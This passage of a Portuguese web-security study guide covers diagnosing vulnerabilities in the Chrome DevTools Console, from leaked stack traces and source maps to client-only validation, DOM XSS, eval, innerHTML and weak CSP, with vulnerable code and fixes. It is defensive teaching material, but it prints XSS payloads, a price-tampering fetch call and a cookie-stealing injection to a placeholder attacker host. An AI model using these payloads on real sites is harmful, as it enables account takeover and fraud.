1. **Stack trace do Back-End refletido no Console**: quando o servidor está com modo de depuração ativo (`APP_DEBUG=true`, `NODE_ENV=development`, `ASPNETCORE_ENVIRONMENT=Development`) e envia a pilha de execução de Python/Django, Java/Spring, PHP/Laravel ou Node.js na resposta HTTP, que acaba impressa no Console.
2. **Stack trace detalhado do Front-End com Source Maps públicos (`.js.map`)**: quando o servidor de produção publica junto com o `bundle.min.js` os arquivos `bundle.min.js.map`. O Chrome DevTools baixa automaticamente o arquivo `.map` e reconstrói na aba Console e na aba *Sources* toda a árvore original de diretórios TypeScript/React da empresa, incluindo comentários internos dos desenvolvedores, nomes de variáveis privadas e lógica de negócio não minificada!

No Console, você diagnostica isso observando se os links à direita das mensagens de erro apontam para arquivos originais como `webpack:///./src/services/InternalAuthService.ts:84` em vez de um código minificado, ou se o corpo de um erro contém linhas `at Object.<anonymous> (/app/src/controllers/...)`.

###### Exemplo de Código Vulnerável
```javascript
// [CONFIGURAÇÃO DE BUILD E SERVIDOR VULNERÁVEL]
// 1. No vite.config.js / webpack.config.js de produção:
export default {
  build: {
    sourcemap: true // GERA E PUBLICA arquivos .map acessíveis publicamente na web!
  }
};

// 2. No middleware global de erro do Express (Back-end):
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack // Expõe a pilha de execução do servidor para qualquer cliente!
  });
});
```

###### Exemplo de Código Corrigido
**`[RECOMENDAÇÃO]`** Em produção, desative a publicação pública de *Source Maps* (ou gere `sourcemap: 'hidden'` para enviá-los apenas ao servidor privado do Sentry/Datadog e apague os arquivos `.map` antes do deploy público) e jamais envie `err.stack` nas respostas HTTP:

```javascript
// [CONFIGURAÇÃO DE BUILD E SERVIDOR CORRIGIDA]
// 1. No vite.config.js / webpack.config.js de produção:
export default {
  build: {
    sourcemap: false // Não publica mapas de código-fonte no servidor web público
  }
};

// 2. No Nginx (bloqueando acesso caso algum arquivo .map seja esquecido no diretório):
// location ~* \.map$ { deny all; return 404; }

// 3. No middleware global de erro do Express (Back-end):
app.use((err, req, res, next) => {
  console.error("[ERRO INTERNO SERVIDOR]", err.stack); // Visível apenas no terminal/log do servidor
  res.status(500).json({
    error: "Erro interno do servidor."
    // NUNCA incluir err.stack na resposta enviada ao navegador!
  });
});
```

---

##### 3. Tokens, senhas e dados sensíveis esquecidos em `console.log()` em produção

###### O problema e como diagnosticar no Console
Durante a construção de telas de login, formulários de cartão de crédito e integrações de APIs, programadores frequentemente escrevem `console.log("Dados do form:", formData)` ou `console.log("JWT:", token)` para testar se as variáveis estão chegando corretamente. Quando esse código sobe para produção, qualquer pessoa que abra o Console (ou um script malicioso que sobrescreva `console.log` para interceptar seus argumentos!) terá acesso imediato às credenciais em texto claro, tokens JWT e dados pessoais (CPF, RG, dados clínicos ou bancários).

Para diagnosticar no Console: ative **Preserve log** e o nível **Verbose**, abra a **Console Sidebar** em **User messages** e realize um login completo e uma atualização de perfil.

###### Exemplo de Código Vulnerável
```javascript
// [FRONT-END VULNERÁVEL - auth-login.js]
async function realizarLogin(evento) {
  evento.preventDefault();
  const email = document.querySelector("#email").value;
  const senha = document.querySelector("#senha").value;

  // VULNERÁVEL: Imprime a senha em texto puro no Console antes de enviar!
  console.log("[Debug Login] Tentando autenticar:", { email, senha });

  const resposta = await fetch("/api/v1/auth/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, senha })
  });

  const dados = await resposta.json();
  // VULNERÁVEL: Imprime o token JWT e o refresh_token no Console!
  console.debug("Resposta de autenticação recebida:", dados);
  localStorage.setItem("jwt_token", dados.accessToken);
}
```

###### Exemplo de Código Corrigido
**`[REQUISITO]`** Remova todo registro de credenciais e tokens no cliente, utilize cookies `HttpOnly` emitidos pelo servidor (para que o token sequer precise ser manipulado pelo JavaScript) e configure o empacotador para eliminar chamadas `console.*` residuais no *build* de produção:

```javascript
// [FRONT-END CORRIGIDO - auth-login.js]
async function realizarLogin(evento) {
  evento.preventDefault();
  const email = document.querySelector("#email").value;
  const senhaInput = document.querySelector("#senha");

  try {
    const resposta = await fetch("/api/v1/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "same-origin", // O servidor definirá o cookie __Host-session (HttpOnly; Secure; SameSite=Lax)
      body: JSON.stringify({ email, senha: senhaInput.value })
    });

    // Limpa o valor do campo de senha da memória do DOM imediatamente:
    senhaInput.value = "";

    if (!resposta.ok) {
      mostrarMensagemErro("Credenciais inválidas ou conta temporariamente bloqueada.");
      return;
    }

    // Redireciona sem imprimir credenciais nem armazenar tokens em localStorage:
    window.location.assign("/painel");
  } catch {
    mostrarMensagemErro("Erro de comunicação com o servidor.");
  }
}
```

---

##### 4. Falhas de validação (validação apenas no front-end contornada pelo Console)

###### O problema e como diagnosticar no Console
Uma regra de ouro da Segurança da Informação é: **validação no cliente (front-end) serve para Experiência do Usuário (UX — *User Experience*) e economia de requisições; segurança real só existe com validação no servidor (back-end)**. Qualquer trava implementada apenas em HTML ou JavaScript — como atributos `disabled`, `readonly`, `maxlength`, `min`, `max`, variáveis `let isAdmin = false` ou funções JavaScript que calculam o preço final no navegador — pode ser **instantaneamente neutralizada ou alterada pelo usuário através do REPL da aba Console**!

No Console, você diagnostica essa vulnerabilidade em menos de 10 segundos:
1. Modificando variáveis globais ou propriedades de estado da página;
2. Removendo travas de formulário com `document.querySelector('#botao').disabled = false` ou `$0.removeAttribute('readonly')`;
3. Ou disparando diretamente uma chamada `fetch()` no prompt do Console enviando valores que a interface gráfica bloquearia (como quantidade negativa `-5`, desconto de `99%` ou `role: "admin"`).

###### Exemplo de Código Vulnerável
```javascript
// [FRONT-END VULNERÁVEL - checkout.js]
// A aplicação valida o limite de desconto apenas no JavaScript do navegador
// e envia o valor final calculado pelo cliente para o servidor cobrar!
async function aplicarPedido(produtoId, precoUnitario, percentualDesconto) {
  if (percentualDesconto > 15) {
    alert("Desconto máximo permitido para clientes comuns é 15%!");
    return; // Acha que bloqueou o usuário...
  }

  const totalCalculadoNoCliente = precoUnitario * (1 - percentualDesconto / 100);

  // VULNERÁVEL: Envia o preço calculado no navegador para o back-end!
  // Basta o usuário abrir o Console e rodar:
  // fetch('/api/v1/pedidos', { method: 'POST', body: JSON.stringify({ produtoId: 10, valorTotal: 0.01 }) })
  await fetch("/api/v1/pedidos", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ produtoId, valorTotal: totalCalculadoNoCliente })
  });
}
```

###### Exemplo de Código Corrigido
**`[REQUISITO]`** O cliente deve enviar apenas **identificadores e intenções** (ex.: `produtoId`, `quantidade`, `codigoCupom`), e o **back-end** deve validar os limites, consultar o preço oficial no banco de dados e calcular o valor final de forma autoritativa:

```javascript
// [FRONT-END CORRIGIDO - checkout.js]
// O cliente envia apenas o ID do produto, a quantidade e o código do cupom:
async function aplicarPedido(produtoId, quantidade, codigoCupom) {
  const resp = await fetch("/api/v1/pedidos", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ produtoId, quantidade, codigoCupom })
  });
  // ...
}

// [BACK-END CORRIGIDO - pedidosController.js]
app.post("/api/v1/pedidos", autenticarSessao, async (req, res) => {
  const { produtoId, quantidade, codigoCupom } = req.body;

  // 1. Validação estrita de tipo e intervalo no servidor:
  if (!Number.isInteger(quantidade) || quantidade < 1 || quantidade > 50) {
    return res.status(400).json({ erro: "Quantidade inválida." });
  }

  // 2. Busca o preço real diretamente no banco de dados (ignora qualquer preço vindo do cliente):
  const produto = await db.buscarProdutoPorId(produtoId);
  if (!produto) return res.status(404).json({ erro: "Produto não encontrado." });

  // 3. Valida o cupom e permissões no servidor:
  const desconto = await validarCupomNoServidor(codigoCupom, req.usuario.id);
  const valorTotalSeguro = produto.precoCentavos * quantidade * (1 - desconto);

  const pedido = await db.criarPedido({
    usuarioId: req.usuario.id,
    produtoId: produto.id,
    quantidade,
    valorTotalCentavos: Math.round(valorTotalSeguro)
  });

  return res.status(201).json(pedido);
});
```

---

##### 5. Vulnerabilidades de JavaScript e manipulação indevida do DOM

###### O problema e como diagnosticar no Console
Mesmo quando o servidor é seguro, o código JavaScript executado no navegador pode introduzir vulnerabilidades graves de cliente ao ler dados de **Fontes não confiáveis (*Sources*)** — como `location.search` (*query string*), `location.hash` (fragmento após `#`), `document.referrer`, `window.name` ou mensagens `postMessage` — e passá-los sem validação para **Sumidouros perigosos (*Sinks*)** de navegação ou mutação do DOM, como `location.href`, `location.assign()`, `iframe.src`, `script.src` ou `element.setAttribute()`.

No Console, você diagnostica isso inspecionando os *listeners* com `getEventListeners(window)` e testando o comportamento da página ao fornecer URLs com esquemas `javascript:alert(1)` ou `https://site-externo.test` nos parâmetros de redirecionamento (`?redirect=...`, `?next=...`, `#retorno=...`), observando os erros e ações disparadas no Console.

###### Exemplo de Código Vulnerável
```javascript
// [FRONT-END VULNERÁVEL - redirecionamento e postMessage inseguros]
// 1. Open Redirect e DOM XSS via parâmetro "?proximo=" na URL:
const params = new URLSearchParams(window.location.search);
const destino = params.get("proximo");
if (destino) {
  // PERIGO CRÍTICO:
  // Se ?proximo=https://phishing.test -> Open Redirect!
  // Se ?proximo=javascript:alert(document.domain) -> DOM-based XSS!
  window.location.href = destino;
}

// 2. Listener de postMessage sem verificação de origem:
window.addEventListener("message", (evento) => {
  // PERIGO: Qualquer site que abrir esta página em popup/iframe pode enviar mensagens!
  if (evento.data.acao === "atualizarLinkAjuda") {
    document.querySelector("#link-ajuda").href = evento.data.url;
  }
});
```

###### Exemplo de Código Corrigido
**`[REQUISITO]`** Valide todas as URLs de redirecionamento garantindo que pertençam à mesma origem (e utilizem apenas protocolos `https:` ou `http:`) e verifique estritamente `evento.origin` em qualquer ouvinte `postMessage`:

```javascript
// [FRONT-END CORRIGIDO - Validação de URL e Origem]
function redirecionarComSeguranca(urlCandidata) {
  try {
    // Resolve a URL candidata tendo a origem atual como base:
    const urlResolvida = new URL(urlCandidata, window.location.origin);

    // 1. Garante protocolo seguro (bloqueia javascript:, data:, vbscript:):
    const protocoloPermitido = urlResolvida.protocol === "https:" || urlResolvida.protocol === "http:";

    // 2. Garante que o destino pertence EXATAMENTE à mesma origem (bloqueia Open Redirect):
    const mesmaOrigem = urlResolvida.origin === window.location.origin;

    if (protocoloPermitido && mesmaOrigem) {
      window.location.assign(urlResolvida.pathname + urlResolvida.search + urlResolvida.hash);
    } else {
      console.warn("Redirecionamento externo bloqueado por segurança.");
      window.location.assign("/home");
    }
  } catch {
    window.location.assign("/home");
  }
}

// Listener de postMessage com verificação estrita de origem:
const ORIGENS_CONFIAVEIS = new Set(["https://pagamentos.loja-ficticia.test"]);

window.addEventListener("message", (evento) => {
  if (!ORIGENS_CONFIAVEIS.has(evento.origin)) {
    return; // Ignora imediatamente mensagens de origens não autorizadas
  }
  // Processa a mensagem com validação de protocolo da URL...
});
```

---

##### 6. Cross-Site Scripting (XSS) observado e diagnosticado pelo Console

###### O problema e como diagnosticar no Console
O **Cross-Site Scripting (XSS)** ocorre quando uma aplicação inclui dados não confiáveis em uma página web sem a devida validação ou codificação contextual (*contextual output encoding*), permitindo a execução de código JavaScript arbitrário no navegador da vítima sob a origem da aplicação (veja a [Seção 3.2](./03a-vulnerabilidades-parte1.md#s3-2)).

A aba Console é o principal instrumento para **detectar, depurar e confirmar XSS** em laboratórios autorizados:
1. **Sondas sintáticas (*Canary / Syntax Probing*)**: ao injetar uma string de teste como `sonda"'><script>` ou `sonda';` em um campo de busca e olhar para o Console, o surgimento imediato de `Uncaught SyntaxError` ou `Uncaught ReferenceError` revela que a entrada caiu dentro de um bloco executável de JavaScript ou atributo de evento (`onclick="..."`).
2. **Provas de conceito não intrusivas (`console.log(document.origin)`)**: em testes profissionais modernos, em vez de usar `alert(1)` (que bloqueia a thread e às vezes é filtrado por WAFs — *Web Application Firewalls* — ou bloqueado em iframes cross-origin), utiliza-se `console.log("XSS_CONFIRMADO_EM:", window.origin)` ou `<img src=x onerror="console.error('XSS_DOM:', document.domain)">`, observando o disparo e seu *stack trace* diretamente na aba Console!
3. **Rastreamento de DOM XSS**: quando o payload executa no Console, expandir a pilha de chamadas (*stack trace*) mostra exatamente qual função JavaScript do bundle da aplicação leu a fonte contaminada e a inseriu no sumidouro (*sink*) do DOM.

###### Exemplo de Código Vulnerável
```html
<!-- [TEMPLATE / SCRIPT VULNERÁVEL A XSS REFLETIDO E DOM-BASED] -->
<div id="resultado-busca"></div>

<script>
  // Lê o parâmetro "?termo=" diretamente da URL e concatena em HTML:
  const termo = new URLSearchParams(window.location.search).get("termo");
  if (termo) {
    // Em ambiente de laboratório autorizado, se a URL for:
    // https://loja-ficticia.test/busca?termo=<img src=x onerror="console.error('XSS_ATIVO', window.origin)">
    // O navegador tenta carregar a imagem 'x', falha, e executa o JavaScript do onerror!
    document.getElementById("resultado-busca").innerHTML =
      "<p>Você pesquisou por: <b>" + termo + "</b></p>";
  }
</script>
```
Ao carregar essa URL no laboratório, a aba Console exibe:
1. `GET https://loja-ficticia.test/x 404 (Not Found)`
2. `❌ XSS_ATIVO https://loja-ficticia.test` (apontando para `onerror` na linha do elemento `<img>` injetado!).

###### Exemplo de Código Corrigido
**`[REQUISITO]`** Construa nós do DOM de forma programática e insira dados de usuários utilizando exclusivamente propriedades de texto puro (`textContent` / `innerText`), que tratam `<` e `>` como caracteres literais inofensivos e nunca como tags HTML:

```html
<!-- [CÓDIGO CORRIGIDO CONTRA XSS] -->
<div id="resultado-busca"></div>

<script>
  const termo = new URLSearchParams(window.location.search).get("termo");
  if (termo) {
    const container = document.getElementById("resultado-busca");
    container.replaceChildren(); // Limpa o conteúdo anterior com segurança

    const paragrafo = document.createElement("p");
    paragrafo.append("Você pesquisou por: ");

    const destaque = document.createElement("b");
    // SEGURO: textContent codifica automaticamente qualquer caractere especial HTML (<, >, &, ", ')
    destaque.textContent = termo;

    paragrafo.appendChild(destaque);
    container.appendChild(paragrafo);
  }
</script>
```

---

##### 7. Uso inseguro de `eval()` (e equivalentes como `new Function()`, `setTimeout("...", 100)`)

###### O problema e como diagnosticar no Console
A função **`eval(string)`** invoca o compilador/interpretador JavaScript em tempo de execução para executar uma string arbitrária como se fosse código-fonte com todos os privilégios do escopo atual. Existem também os chamados **"equivalentes implícitos de `eval`"** que têm exatamente o mesmo efeito perigoso quando recebem uma **string** em vez de uma função:
- `new Function("arg1", "corpoDoCodigoEmString")`
- `setTimeout("codigoEmString()", 1000)`
- `setInterval("codigoEmString()", 1000)`

Se qualquer fragmento de entrada do usuário chegar a uma dessas funções, ocorre **Injeção de Código JavaScript (DOM XSS)** imediata. Além disso, o uso de `eval()` obriga os desenvolvedores a adicionarem a diretiva insegura `'unsafe-eval'` no cabeçalho CSP, enfraquecendo a defesa de toda a aplicação.

No Console, o uso de `eval()` é diagnosticado quando:
- O CSP bloqueia a execução e exibe `Uncaught EvalError: Refused to evaluate a string as JavaScript because 'unsafe-eval' is not an allowed source...`; ou
- No *stack trace* de um erro ou log no Console aparece uma referência a `eval at <nomeDaFuncao> (arquivo.js:linha)` ou `VM1042:1` (scripts gerados dinamicamente na máquina virtual V8).

###### Exemplo de Código Vulnerável
```javascript
// [FRONT-END VULNERÁVEL - Uso de eval() e setTimeout com string]
// 1. Usar eval() para converter JSON ou calcular expressões dinâmicas:
function processarRespostaLegada(textoJson, campoOrdenacao) {
  // PERIGO 1: Se textoJson contiver código JS em vez de JSON puro, ele será executado!
  const dados = eval("(" + textoJson + ")");

  // PERIGO 2: Acessar propriedade via eval concatenando o nome do campo vindo da URL:
  // Se campoOrdenacao for: "preco; fetch('https://atacante.test/?c='+document.cookie)"
  const valor = eval("dados.item." + campoOrdenacao);

  // PERIGO 3: Passar uma string para setTimeout:
  setTimeout("atualizarPainel('" + campoOrdenacao + "')", 500);
  return valor;
}
```

###### Exemplo de Código Corrigido
**`[REQUISITO]`** Substitua `eval()` por **`JSON.parse()`** para análise de dados JSON, utilize notação de colchetes (`objeto[propriedade]`) com lista de permissão (*allowlist*) para acesso dinâmico a propriedades e passe sempre **referências de funções** (*callbacks* / *arrow functions*) para `setTimeout` e `setInterval`:

```javascript
// [FRONT-END CORRIGIDO - Sem eval() e compatível com CSP estrito]
const CAMPOS_PERMITIDOS = new Set(["preco", "nome", "dataCriacao"]);

function processarRespostaSegura(textoJson, campoOrdenacao) {
  // 1. JSON.parse analisa APENAS dados JSON (nunca executa funções ou expressões JS):
  const dados = JSON.parse(textoJson);

  // 2. Acesso seguro a propriedades dinâmicas via allowlist e colchetes:
  if (!CAMPOS_PERMITIDOS.has(campoOrdenacao)) {
    throw new Error("Campo de ordenação não permitido.");
  }
  const valor = dados?.item?.[campoOrdenacao];

  // 3. setTimeout recebendo uma função real (Arrow Function), nunca uma string:
  setTimeout(() => {
    atualizarPainel(campoOrdenacao);
  }, 500);

  return valor;
}
```

---

##### 8. Problemas com `innerHTML` vs. uso seguro de `textContent` e `DOMPurify`

###### O problema e como diagnosticar no Console
Propriedades e métodos de inserção de marcação HTML — como **`element.innerHTML`**, **`element.outerHTML`**, **`element.insertAdjacentHTML()`** e **`document.write()`** — instruem o navegador a analisar (*parse*) a string fornecida como HTML vivo e construir elementos no DOM.

> [!CAUTION]
> **Pegadinha clássica de prova sobre `innerHTML` e XSS**: De acordo com a especificação do HTML5, tags `<script>alert(1)</script>` inseridas via `innerHTML` **não são executadas** pelo navegador. Muitos candidatos e desenvolvedores acham, por isso, que `innerHTML` é seguro contra XSS! **Isso é um erro grave**: basta usar qualquer elemento HTML com manipuladores de eventos (*event handlers*), como `<img src="invalido" onerror="alert(1)">`, `<svg onload="alert(1)">` ou `<iframe src="javascript:alert(1)">`, para que o código JavaScript seja executado imediatamente via `innerHTML`!

No Console, você diagnostica problemas com `innerHTML` observando erros de carregamento de imagens falsas (`GET https://.../x 404`) seguidos da execução de eventos `onerror`/`onload`, ou quando a aplicação possui **Trusted Types** habilitado via CSP (`require-trusted-types-for 'script'`) e o Console emite o erro:
`❌ Uncaught TypeError: Failed to set the 'innerHTML' property on 'Element': This document requires 'TrustedHTML' assignment.`

###### Exemplo de Código Vulnerável
```javascript
// [FRONT-END VULNERÁVEL - Uso direto de innerHTML com dados de usuários]
function exibirBiografiaUsuario( perfil ) {
  const bioContainer = document.querySelector("#bio-usuario");
  const nomeContainer = document.querySelector("#nome-usuario");

  // VULNERÁVEL 1: Usar innerHTML para exibir um simples nome em texto puro:
  nomeContainer.innerHTML = perfil.nomeExibicao;

  // VULNERÁVEL 2: Usar innerHTML para renderizar biografia com formatação HTML rica
  // sem sanitizar tags e atributos perigosos (como <img src=x onerror=...>):
  bioContainer.innerHTML = perfil.biografiaHtml;
}
```

###### Exemplo de Código Corrigido
**`[REQUISITO]`**
1. Quando o dado deve ser exibido apenas como **texto**, use sempre **`textContent`** (nunca `innerHTML`).
2. Quando a funcionalidade de negócio realmente exige renderizar **HTML rico** (ex.: um editor de texto formatado de blog ou e-mail), sanitize a string imediatamente antes da inserção com uma biblioteca robusta baseada em análise de DOM como o **DOMPurify**, restringindo tags e atributos permitidos:

```javascript
// [FRONT-END CORRIGIDO - textContent para texto e DOMPurify para HTML rico]
import DOMPurify from "dompurify";

function exibirBiografiaUsuarioSegura( perfil ) {
  const bioContainer = document.querySelector("#bio-usuario");
  const nomeContainer = document.querySelector("#nome-usuario");

  // 1. Para dados de texto simples: SEMPRE use textContent!
  nomeContainer.textContent = perfil.nomeExibicao;

  // 2. Para conteúdo que precisa de formatação HTML: sanitize com DOMPurify
  // permitindo apenas um subconjunto seguro de tags de formatação de texto:
  const htmlSanitizado = DOMPurify.sanitize(perfil.biografiaHtml, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "p", "br", "ul", "ol", "li", "code"],
    ALLOWED_ATTR: [] // Nenhum atributo (remove onclick, onerror, onload, style, href, src!)
  });

  bioContainer.innerHTML = htmlSanitizado;
}
```

---

##### 9. Content Security Policy (CSP) mal configurada diagnosticada via avisos do Console

###### O problema e como diagnosticar no Console
A **Content Security Policy (CSP)** é um cabeçalho HTTP de defesa em profundidade (`Content-Security-Policy`) que restringe de quais origens o navegador pode carregar scripts, estilos, imagens, conexões e quadros. Quando mal configurada, duas situações opostas aparecem na aba Console:
1. **CSP que quebra a própria aplicação por falta de planejamento**: o administrador ativa um CSP rígido diretamente em produção sem antes testar em modo `Content-Security-Policy-Report-Only`, fazendo com que fontes, estilos ou scripts legítimos da página sejam bloqueados com dezenas de erros vermelhos `Refused to load...` no Console.
2. **CSP ilusória (permissiva demais) revelada nas mensagens do Console**: quando qualquer erro ou aviso de CSP aparece no Console, o Chrome imprime a **string completa da diretiva ativa** na mensagem (ex.: `...violates the following Content Security Policy directive: "script-src * 'unsafe-inline' 'unsafe-eval'"`). Ao ler essa mensagem no Console (ou inspecionar em *Network* / *Application > Frames*), o auditor percebe imediatamente que a política inclui `'unsafe-inline'` e `'unsafe-eval'` sem *nonce*, o que **anula quase totalmente a proteção contra XSS**!

Além disso, se uma página servida em HTTPS tenta carregar sub-recursos em `http://`, o Console exibe avisos ou erros de **Mixed Content** que poderiam ser mitigados com `upgrade-insecure-requests` no CSP e migração definitiva dos links para HTTPS.

###### Exemplo de Configuração Vulnerável
```http
# [CABEÇALHO HTTP DE RESPOSTA VULNERÁVEL / INEFICAZ]
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src *; script-src * 'unsafe-inline' 'unsafe-eval' data:;
```
```html
<!-- [HTML VULNERÁVEL - Scripts inline espalhados e handlers onclick no HTML] -->
<button onclick="excluirConta(123)">Excluir Conta</button>
<script>
  const usuarioAtual = "Maria";
  eval("console.log('Iniciado para ' + usuarioAtual)");
</script>
```

###### Exemplo de Configuração Corrigida
**`[REQUISITO]`** Remova `'unsafe-inline'`, `'unsafe-eval'` e curingas `*` de `script-src`; mova scripts para arquivos externos na própria origem (`'self'`) ou proteja scripts inline estritamente necessários com um **Nonce criptográfico aleatório** gerado a cada requisição; e utilize eventos registrados via `addEventListener` em vez de atributos `onclick`:

```http
# [CABEÇALHO HTTP DE RESPOSTA CORRIGIDO]
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-8f4a9b2c1d7e6f5a4b3c2d1e'; style-src 'self'; img-src 'self' data: https://cdn.loja-ficticia.test; connect-src 'self' https://api.loja-ficticia.test; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests;
```
```html
<!-- [HTML CORRIGIDO - Compatível com CSP estrito baseado em Nonce e 'self'] -->
<button id="btn-excluir" data-user-id="123">Excluir Conta</button>

<!-- Apenas scripts com o nonce exato da resposta HTTP atual são executados pelo navegador: -->
<script nonce="8f4a9b2c1d7e6f5a4b3c2d1e" src="/static/js/conta.js" defer></script>
```
```javascript
// [ARQUIVO /static/js/conta.js CORRIGIDO]
document.getElementById("btn-excluir")?.addEventListener("click", (evento) => {
  const userId = evento.currentTarget.dataset.userId;
  excluirConta(userId);
});
```

---

##### Tabela-Resumo: Diagnóstico de Segurança na Aba Console

| Cenário / Evidência no Console | Causa Técnica Principal | Risco de Segurança Associado | Correção Primária Recomendada |
| :--- | :--- | :--- | :--- |
| Objeto de erro HTTP 500 contendo query SQL, IP interno ou caminho `/var/www/...` | Tratamento de erro verboso no servidor retornado ao cliente e impresso via `console.error()` | **Information Disclosure** (facilita SQLi, Path Traversal e mapeamento de rede interna) | **`[REQUISITO]`** Logar detalhes apenas no servidor com `traceId` e retornar mensagem genérica ao cliente. |
| Links no Console apontando para `webpack:///./src/...` em produção | Publicação de arquivos `.js.map` (*Source Maps*) no servidor de produção | Exposição integral do código-fonte original, comentários internos e lógica de negócio | **`[RECOMENDAÇÃO]`** Desabilitar `sourcemap` público no build de produção e bloquear `.map` no servidor web. |
| Senhas, CPFs ou JWT (`eyJ...`) visíveis em `User messages` ou `Verbose` | Chamadas `console.log()` / `console.debug()` esquecidas pelo desenvolvedor | Vazamento de credenciais e PII no cliente; roubo imediato de sessão | **`[REQUISITO]`** Remover logs sensíveis no código, usar `drop_console` no build e cookies `HttpOnly`. |
| Possibilidade de alterar preço, desconto ou `role` via `fetch()` no REPL | Validação de regras de negócio realizada apenas no front-end | Fraude financeira, **Mass Assignment**, **BOLA/IDOR** e escalação de privilégio | **`[REQUISITO]`** Validar permissões, limites e calcular preços exclusivamente no servidor (back-end). |
| `Uncaught SyntaxError` ao digitar `'` ou `"` em um campo de busca | Interpolação direta de entrada do usuário dentro de tag `<script>` ou evento inline | **Cross-Site Scripting (XSS)** refletido ou baseado em DOM | **`[REQUISITO]`** Não interpolar dados em scripts; usar `textContent` e serialização JSON segura. |
| Execução de `onerror` ao atribuir `<img src=x onerror=...>` em `innerHTML` | Uso de `innerHTML` com dados não confiáveis sem sanitização | **DOM-based / Stored XSS** (sequestro de conta e alteração da página) | **`[REQUISITO]`** Usar `textContent` para texto puro ou sanitizar HTML rico com **DOMPurify** + **Trusted Types**. |
| `Uncaught EvalError` ou frames `eval at ...` no *stack trace* | Uso de `eval()`, `new Function()` ou `setTimeout("string")` | Execução arbitrária de código (XSS) e necessidade de `'unsafe-eval'` no CSP | **`[REQUISITO]`** Substituir por `JSON.parse()`, acesso por colchetes validados e *arrow functions*. |
| Aviso/erro de CSP exibindo `script-src * 'unsafe-inline' 'unsafe-eval'` | Política de CSP excessivamente permissiva criada para evitar bloqueios | Anulação prática da proteção do CSP contra ataques de XSS | **`[REQUISITO]`** Usar `script-src 'self'` com **nonces** ou **hashes** criptográficos e remover `'unsafe-inline'`. |
| Aviso de bloqueio de colagem pedindo para digitar `"allow pasting"` | Proteção nativa do Chrome DevTools contra **Self-XSS** | Engenharia social induzindo a vítima a executar código malicioso na própria conta | **`[RECOMENDAÇÃO]`** Cookies `HttpOnly`, reautenticação/MFA em ações críticas e aviso educativo no Console. |

---

---

> [⬅️ 2.2 Chrome DevTools — Aba Application](./02b-devtools-application.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [3A. Vulnerabilidades Web (3.0 a 3.9) ➡️](./03a-vulnerabilidades-parte1.md)
